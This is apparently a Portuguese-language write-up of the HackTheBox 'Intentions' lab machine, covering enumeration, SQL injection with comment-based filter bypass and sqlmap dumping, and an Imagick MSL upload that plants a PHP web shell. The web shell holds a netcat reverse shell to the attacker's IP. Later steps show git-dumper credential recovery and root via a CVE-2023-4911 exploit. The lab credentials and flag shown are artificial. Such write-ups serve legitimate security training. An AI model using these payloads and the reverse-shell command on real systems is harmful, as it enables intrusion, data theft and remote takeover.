---
layout: post
title: HackTheBox - Intentions Writeup
date: 2023-10-14
categories: [Capture The Flag]
tags: [ctf, sqli, sqlmap, imagick, git, cve-2023-4911]     # TAG names should always be lowercase
imgage: /assets/img/post/intentions/f51a05c5eceb08937686766c1b7de0cc.png
permalink: "/ctf/hackthebox-intentions/"
---
<p align="left"><img width="280" height="280" src="https://www.hackthebox.com/storage/avatars/f51a05c5eceb08937686766c1b7de0cc.png"></p>

## Enumaration
## Nmap

Vamos usar o nmap para descobrir quais as portas estão abertas e quais serviços estão disponíveis.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Intentions]      
└─$ nmap -v -sV -sC -Pn 10.10.11.220 -T4

PORT   STATE SERVICE VERSION                                                                  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)                               
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)                                                    
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Intentions
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Temos duas portas abertas, 22 SSH e 80 HTTP.

## Gobuster

Vamos usar o gobuster para tentar descobrir algo de interessante, já adiantando o único diretório que mais interessa nesse momento é o **/js**, os outros não conseguimos fazer muita coisa.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Intentions]
└─$ gobuster dir -u http://10.10.11.220/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.220/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/gallery              (Status: 302) [Size: 322] [--> http://10.10.11.220]
/admin                (Status: 302) [Size: 322] [--> http://10.10.11.220]
/storage              (Status: 301) [Size: 178] [--> http://10.10.11.220/storage/]
/css                  (Status: 301) [Size: 178] [--> http://10.10.11.220/css/]
/js                   (Status: 301) [Size: 178] [--> http://10.10.11.220/js/]
/logout               (Status: 302) [Size: 322] [--> http://10.10.11.220]
/fonts                (Status: 301) [Size: 178] [--> http://10.10.11.220/fonts/]
```

De todos os arquivos listados, o que chama mais atenção é o **admin.js**, uma dica importante é sempre bom analisar o java script da página, pode conter informações importantes.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Intentions]
└─$ gobuster dir -u http://10.10.11.220/js/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t60 -x js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.220/js/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.js                  (Status: 403) [Size: 162]
/login.js             (Status: 200) [Size: 279176]
/gallery.js           (Status: 200) [Size: 310841]
/admin.js             (Status: 200) [Size: 311246]
/app.js               (Status: 200) [Size: 433792]
```

Com essas informações vamos validar todas essas informações descobertas.

## Port 80 - HTTP (nginx 1.18.0)

Na página inicial temos um campo de login e outro para se registrar.

![image](/assets/img/post/intentions/1.png)

Como não temos nenhuma credencial para autenticar na aplicação, vamos criar uma conta e analisar a aplicação.

![image](/assets/img/post/intentions/2.png)

Inicialmente vemos que se trata de uma aplicação bem simples de galeria de imagens.

![image](/assets/img/post/intentions/3.png)

Em porfile temos um campo de input aonde podemos inserir gêneros favoritos, como a própria aplicação já sugere: food, travel e nature.

![image](/assets/img/post/intentions/4.png)

Na aba **Your Feed**, teremos fotos relacionadas ao que escolhemos na aba profile. 

![image](/assets/img/post/intentions/5.png)

## Burp Suite

Vamos analisar essa requisição no burp para facilitar.

![image](/assets/img/post/intentions/6.png)

A resposta na aba feed seria dessa forma.

![image](/assets/img/post/intentions/7.png)

## SQLinjection

Primeiro vamos precisar saber o número de colunas, para isso vamos usar **order by**, porem aqui temos que usar uma técnica de bypass.
Você pode ver mais sobre isso aqui:

[https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)

![image](/assets/img/post/intentions/8.png)

Tivemos uma reposta **success**.

![image](/assets/img/post/intentions/9.png)

Então seguimos tentando descobrir o número de colunas.

```bash
')/**/ORDER/**/BY/**/1# true
')/**/ORDER/**/BY/**/2# true
')/**/ORDER/**/BY/**/3# true
')/**/ORDER/**/BY/**/4# true
')/**/ORDER/**/BY/**/5# true
')/**/ORDER/**/BY/**/6# false
```

Agora sabemos que temos 5 colunas, ele retorna um erro quando usamos order by 6.

![image](/assets/img/post/intentions/10.png)

Usando union select vamos descobrir a versão dessa banco de dados.

![image](/assets/img/post/intentions/11.png)

![image](/assets/img/post/intentions/12.png)

## sqlmap

Podemos automatizar com sqlmap, devemos salvar a requisição da pagina **genres** e **feed**, a seguir informamos isso para o sqlmap, vai ser da seguinte forma:

```bash
sqlmap -r genres.req -p genres --second-req feed.req --tamper=space2comment --batch --level=5 --risk=3 -D intentions -T users --dump
```

Como resposta temos duas hash de usuários admin.

![image](/assets/img/post/intentions/13.png)

## Exploitation

Antes de prosseguir para logar com o usuário steve, vamos analisar o arquivo **admin.js** que encontramos lá no inicio do nosso recon. 
Alguns comentários com informações importantes.

![image](/assets/img/post/intentions/14.png)

Até então tínhamos o conhecimento do endpoint **/api/v1/**, segundo o comentário acima vemos que existe **/api/v2/**.

![image](/assets/img/post/intentions/15.png)

Quando tentamos fazer login vemos que esse endpoint precisa de um campo chamado **hash**.

![image](/assets/img/post/intentions/16.png)

Conseguimos fazer login na aplicação usando o hash do usuário. 

![image](/assets/img/post/intentions/17.png)

Outro comentário no arquivo **admin.js** que chama bastante atenção.

```js
"The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: https://www.php.net/manual/en/class.imagick.php"
```

Pesquisando no google nos deparamos com o seguinte site mostrado abaixo, seguindo passo a passo da explicação do artigo é possível conseguir uma reverse shell.

![image](/assets/img/post/intentions/18.png)

## Reverse Shell com www-data

No seguinte endpoint devemos usar dois parâmetro, path e effect e o método POST.

![image](/assets/img/post/intentions/19.png)

Primeiro, precisamos criar uma imagem com um web shell, já que o MSL permite apenas trabalhar com imagens.

```bash
convert xc:red -set 'Copyright' '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f");?>' shell.png
```

Segundo, vamos criar um arquivo MSL que copiará esta imagem do nosso servidor HTTP para um diretório web gravável.
Sabendo disso no próprio burp vamos fazer algumas alterações para conseguir uma reverse shell, com base no artigo que encontramos no google.

![image](/assets/img/post/intentions/20.png)

Agora basta acessar o seguinte link para receber a conexão no netcat. http://10.10.11.220/shell.php

![image](/assets/img/post/intentions/21.png)

## Shell com greg

Dentro do diretório da aplicação web encontramos uma pasta .git, porem temos que fazer download para nossa máquina local.

![image](/assets/img/post/intentions/22.png)

Primeiro temos que iniciar um servidor usando python no servidor.

```bash
www-data@intentions:~/html/intentions$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

A seguir usamos uma ferramenta git dumper para fazer download.

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Intentions/src/.git]
└─$ /opt/git-dumper/git_dumper.py http://10.10.11.220:8000/.git ~/HTB/Intentions/src
```

Não foi muito difícil encontrar informações sensíveis, pois estava nos logs.

![image](/assets/img/post/intentions/23.png)
![image](/assets/img/post/intentions/24.png)

```bash
greg:Gr3g1sTh3B3stDev3l0per!1998!
```

```bash
┌──(c4st13l㉿0x00)-[~/HTB/Intentions]
└─$ ssh greg@10.10.11.220                                                                                                               

Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 14 01:42:33 PM UTC 2023

  System load:           0.0615234375
  Usage of /:            58.5% of 6.30GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.220
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4ec6

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
$ bash -i
greg@intentions:~$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
```

User flag xD

```bash
greg@intentions:~$ cat user.txt 
ddb577e240e6ff27b1edcaee4d037ca2
```

## Privilege Escalation

## CVE-2023-4911

Essa máquina está vulnerável a **Looney Tunables**, essa vulnerabilidade é um buffer overflow no GNU C library’s dynamic loader. A biblioteca GNU C (comumente chamada de glibc) é um componente fundamental da maioria dos sistemas operacionais Unix.

Para verificar se a máquina está vulnerável, posso executar o seguinte comando:

![image](/assets/img/post/intentions/25.png)

O segfault indica que é vulnerável.

Como a vulnerabilidade existe há apenas uma semana, novas explorações de prova de conceito (POC) ainda estão sendo lançadas. Neste ponto, a exploração com a qual tive mais sucesso vem do usuário do Twitter, **bl4sty**.

![image](/assets/img/post/intentions/26.png)

Ele fornece um script Python que irá: 

- Gere uma versão corrigida do glibc que executa um shell ao ser carregado. 
- Configure o ambiente para ativar o overflow. 
- Execute um binário SetUID su repetidamente até que um shell seja retornado.

Irei salvar uma cópia do gnu-acme.py na maquina da vitima.

Após executar o script ele começa a tentar explorar, mostrando "." caracteres na parte inferior para mostrar tentativas fracassadas. Isso normalmente leva muito tempo, dependendo do hardware e da configuração do host.
Depois de vários minutos, ele envia uma mensagem informando que possui um shell:

![image](/assets/img/post/intentions/27.png)

Flag root xD

![image](/assets/img/post/intentions/28.png)

## Referência

[https://www.darkreading.com/vulnerabilities-threats/looney-tunables-linux-flaw-sees-snowballing-proof-of-concept-exploits](https://www.darkreading.com/vulnerabilities-threats/looney-tunables-linux-flaw-sees-snowballing-proof-of-concept-exploits)

[https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

[https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)